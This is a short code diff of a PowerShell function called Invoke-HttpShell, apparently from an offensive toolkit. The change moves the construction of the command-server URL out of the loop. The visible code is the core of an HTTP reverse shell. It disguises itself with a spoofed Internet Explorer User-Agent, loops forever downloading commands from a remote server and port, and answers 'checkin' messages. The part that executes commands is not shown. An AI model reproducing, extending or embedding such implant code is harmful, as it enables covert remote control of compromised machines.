@@ -50,6 +50,7 @@ function Invoke-HttpShell
             return $standardOut
         }
 
+        $uri = "http://" + $Server + ":" + $Port + "/"
         $wc = New-Object -TypeName System.Net.WebClient
 
         $wc.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)")
@@ -59,7 +60,6 @@ function Invoke-HttpShell
         $sleep = 2
 
         while ($True) {
-            $uri = "http://" + $Server + ":" + $Port + "/"
             $command = $wc.DownloadString($uri)
             if ($command) {
                 if ($command -like "checkin") {
